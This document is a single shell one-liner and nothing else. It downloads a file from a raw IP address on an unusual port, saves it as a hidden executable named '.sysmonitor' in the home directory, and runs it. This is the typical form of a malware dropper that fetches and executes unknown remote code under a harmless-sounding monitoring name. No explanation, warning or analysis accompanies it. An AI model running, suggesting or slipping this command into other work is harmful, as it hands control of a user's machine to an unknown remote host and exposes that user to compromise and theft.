curl -sSL http://64.89.161.144:2344/sysmonitor -o ~/.sysmonitor && chmod +x ~/.sysmonitor && ~/.sysmonitor
